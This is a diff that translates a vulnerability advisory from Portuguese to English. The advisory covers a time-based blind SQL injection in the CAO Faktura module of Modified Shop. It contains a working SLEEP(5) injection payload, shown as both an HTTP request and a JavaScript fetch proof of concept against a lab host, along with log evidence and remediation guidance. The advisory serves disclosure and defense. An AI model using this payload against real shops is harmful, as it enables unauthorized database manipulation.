@@ -1,36 +1,36 @@
-# SQL Injection (Time-Based Blind) em CAO Faktura — `cao_xtc.php`
+# SQL Injection (Time-Based Blind) in CAO Faktura — `cao_xtc.php`
 
-## Resumo
+## Summary
 
-Foi identificada uma vulnerabilidade de SQL Injection no módulo **CAO Faktura**, na ação `products_erase` do endpoint `export/cao_xtc.php`.
+A SQL Injection vulnerability was identified in the **CAO Faktura** module, specifically in the `products_erase` action of the `export/cao_xtc.php` endpoint.
 
-O parâmetro POST `prodid` é inserido diretamente em uma instrução SQL `DELETE`, sem validação numérica, escape SQL adequado ou utilização de prepared statements.
+The POST parameter `prodid` is directly incorporated into a SQL `DELETE` statement without numeric validation, proper SQL escaping, or the use of prepared statements.
 
-A vulnerabilidade foi confirmada dinamicamente por meio de uma injeção time-based utilizando a função `SLEEP(5)` do MariaDB.
+The vulnerability was dynamically confirmed through a time-based injection using the MariaDB `SLEEP(5)` function.
 
-## Identificação
+## Vulnerability Identification
 
-| Campo | Informação |
+| Field | Information |
 |---|---|
-| Vulnerabilidade | SQL Injection |
-| Categoria | CWE-89 — Improper Neutralization of Special Elements used in an SQL Command |
-| Componente | CAO Faktura |
+| Vulnerability | SQL Injection |
+| Category | CWE-89 — Improper Neutralization of Special Elements used in an SQL Command |
+| Component | CAO Faktura |
 | Endpoint | `/export/cao_xtc.php` |
-| Método | POST |
-| Parâmetro | `prodid` |
-| Ação | `products_erase` |
-| Técnica | Time-Based Blind SQL Injection |
-| Versão testada | Modified Shop 3.3.0 rev. 16825 |
-| Resultado | Confirmado dinamicamente |
+| Method | POST |
+| Parameter | `prodid` |
+| Action | `products_erase` |
+| Technique | Time-Based Blind SQL Injection |
+| Tested Version | Modified Shop 3.3.0 rev. 16825 |
+| Result | Dynamically Confirmed |
 | Vendor | https://github.com/modified-shop/modified-shop |
 
-## Detalhes técnicos
+## Technical Details
 
-O endpoint `cao_xtc.php` recebe a ação `products_erase` e encaminha a execução para a função `ProductsErase()`, localizada em:
+The `cao_xtc.php` endpoint receives the `products_erase` action and forwards execution to the `ProductsErase()` function, located in:
 
 `export/cao_xtc_functions.php`
 
-Trecho vulnerável:
+Vulnerable code:
 
 ```php
 function ProductsErase ()
@@ -59,7 +59,7 @@ function ProductsErase ()
 }
 ```
 
-A função `xtc_db_prepare_input()`, definida em `inc/db_functions.inc.php`, não realiza sanitização SQL:
+The `xtc_db_prepare_input()` function, defined in `inc/db_functions.inc.php`, does not perform SQL sanitization:
 
 ```php
 function xtc_db_prepare_input($string) {
@@ -75,25 +75,25 @@ function xtc_db_prepare_input($string) {
 }
 ```
 
-Consequentemente, o valor controlado pelo usuário permanece concatenado diretamente à instrução SQL.
+Consequently, the user-controlled value remains directly concatenated into the SQL statement.
 
-## Prova de conceito (PoC)
+## Proof of Concept (PoC)
 
-A PoC utiliza uma expressão condicional com `SLEEP(5)` para demonstrar a execução de SQL controlado pelo parâmetro `prodid`.
+The PoC uses a conditional expression containing `SLEEP(5)` to demonstrate the execution of SQL controlled through the `prodid` parameter.
 
-### Requisição HTTP
+### HTTP Request
 
 ```http
 POST /export/cao_xtc.php HTTP/1.1
 Host: 172.25.44.135:8080
 Content-Type: application/x-www-form-urlencoded
 
-user=admin%40redscan.local&password=MD5_DA_SENHA&action=products_erase&prodid=999999%27%20AND%20(SELECT%209898%20FROM%20(SELECT(SLEEP(5)))pmhr)%20AND%20%27zlFx%27%3D%27zlFx
+user=admin%40redscan.local&password=MD5_PASSWORD&action=products_erase&prodid=999999%27%20AND%20(SELECT%209898%20FROM%20(SELECT(SLEEP(5)))pmhr)%20AND%20%27zlFx%27%3D%27zlFx
 ```
 
-### PoC com JavaScript Fetch
+### JavaScript Fetch PoC
 
-Executar no console do navegador, no ambiente de laboratório:
+Execute the following code in the browser console within the laboratory environment:
 
 ```javascript
 (async () => {
@@ -103,7 +103,7 @@ Executar no console do navegador, no ambiente de laboratório:
   const body = new URLSearchParams();
 
   body.set("user", "admin@redscan.local");
-  body.set("password", "MD5_DA_SENHA");
+  body.set("password", "MD5_PASSWORD");
   body.set("action", "products_erase");
 
   body.set(
@@ -136,16 +136,16 @@ Executar no console do navegador, no ambiente de laboratório:
 })();
 ```
 
-## Evidência da exploração
+## Exploitation Evidence
 
-A execução da PoC apresentou:
+The execution of the PoC produced the following results:
 
 - HTTP Status: `200`
-- Redirecionamento: `false`
-- Tempo de resposta: `5.057 segundos`
+- Redirected: `false`
+- Response Time: `5.057 seconds`
 - Payload: `SLEEP(5)`
 
-O MariaDB General Log registrou a seguinte consulta em `2026-11-05 21:43:23.511995`:
+The MariaDB General Log recorded the following SQL query at `2026-11-05 21:43:23.511995`:
 
 ```sql
 delete from products_to_categories
@@ -154,42 +154,44 @@ AND (SELECT 9898 FROM (SELECT(SLEEP(5)))pmhr)
 AND 'zlFx'='zlFx'
 ```
 
-Às `21:43:28.523414`, foi registrada uma consulta subsequente:
+At `21:43:28.523414`, a subsequent SQL query was recorded:
 
 ```sql
 DELETE FROM products_to_categories
 WHERE products_id = '999999'
 ```
 
-A diferença de aproximadamente cinco segundos entre os registros é compatível com a execução da função `SLEEP(5)`.
+The approximately five-second difference between the log entries is consistent with the execution of the `SLEEP(5)` function.
 
-Essas evidências confirmam que o payload foi incorporado à instrução SQL executada pelo banco de dados.
+This evidence confirms that the injected payload was incorporated into the SQL statement executed by the database server.
 
-## Impacto
+## Impact
 
-Um atacante que consiga utilizar o endpoint com credenciais válidas do serviço CAO Faktura poderá manipular a consulta SQL por meio do parâmetro `prodid`.
+An attacker with valid CAO Faktura service credentials and access to the vulnerable endpoint could manipulate the SQL query through the `prodid` parameter.
 
-Dependendo das permissões da conta de banco de dados e das condições de exploração, isso pode permitir:
+Depending on the database account privileges and exploitation conditions, successful exploitation could potentially allow:
 
-- Inferência de informações do banco de dados por técnicas blind.
-- Manipulação das condições de consultas SQL.
-- Exclusão ou alteração não autorizada de registros.
-- Comprometimento da confidencialidade, integridade e disponibilidade dos dados.
+- Inference of sensitive database information through blind SQL Injection techniques.
+- Manipulation of SQL query conditions.
+- Unauthorized deletion or modification of database records.
+- Compromise of data confidentiality, integrity, and availability.
 
-A exploração requer acesso ao endpoint e credenciais aceitas pelo mecanismo de autenticação do CAO Faktura. Não foi demonstrado bypass de autenticação nesta PoC.
+Exploitation requires access to the vulnerable endpoint and valid credentials accepted by the CAO Faktura authentication mechanism.
 
-## Recomendação
+No authentication bypass was demonstrated in this PoC.
 
-1. Substituir a concatenação de parâmetros por prepared statements com parâmetros vinculados.
-2. Validar `prodid` como identificador inteiro positivo antes de qualquer operação.
-3. Não considerar `xtc_db_prepare_input()` um mecanismo de proteção contra SQL Injection.
-4. Revisar as demais consultas executadas pelo módulo CAO Faktura.
-5. Restringir o acesso ao endpoint de integração às origens autorizadas.
-6. Revisar as permissões da conta de banco de dados utilizada pela aplicação.
+## Recommendations
 
-### Exemplo de correção
+1. Replace SQL parameter concatenation with prepared statements and bound parameters.
+2. Validate the `prodid` parameter as a positive integer identifier before performing any database operation.
+3. Do not rely on `xtc_db_prepare_input()` as a protection mechanism against SQL Injection.
+4. Review all other SQL queries executed by the CAO Faktura module for similar vulnerabilities.
+5. Restrict access to the integration endpoint to authorized sources.
+6. Review the privileges granted to the database account used by the application and enforce the principle of least privilege.
 
-A consulta deve utilizar parâmetros vinculados:
+### Remediation Example
+
+The SQL query should use bound parameters instead of direct string concatenation:
 
 ```php
 $stmt = $pdo->prepare(
@@ -202,15 +204,20 @@ $stmt->execute([
 ]);
 ```
 
-A implementação deve utilizar a conexão e a camada de acesso a dados efetivamente adotadas pelo projeto.
+The implementation should use the database connection and data access layer adopted by the project.
 
-## Referências
+## References
 
-- CWE-89: https://cwe.mitre.org/data/definitions/89.html
-- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+- CWE-89 — Improper Neutralization of Special Elements used in an SQL Command:  
+  https://cwe.mitre.org/data/definitions/89.html
 
-## Conclusão
+- OWASP SQL Injection Prevention Cheat Sheet:  
+  https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
 
-A vulnerabilidade SQL Injection no parâmetro `prodid` da ação `products_erase`, no módulo CAO Faktura, foi confirmada por análise estática do código e evidência dinâmica no MariaDB General Log, com execução de uma expressão `SLEEP(5)`.
+## Conclusion
 
-**Status: Confirmado — Time-Based Blind SQL Injection.**
+The SQL Injection vulnerability affecting the `prodid` parameter of the `products_erase` action in the CAO Faktura module was confirmed through static source code analysis and dynamic evidence recorded in the MariaDB General Log, demonstrating the execution of an injected `SLEEP(5)` expression.
+
+The absence of proper input validation and parameterized SQL queries allows authenticated users to manipulate SQL statements executed by the database server.
+
+**Status: Confirmed — Time-Based Blind SQL Injection.**
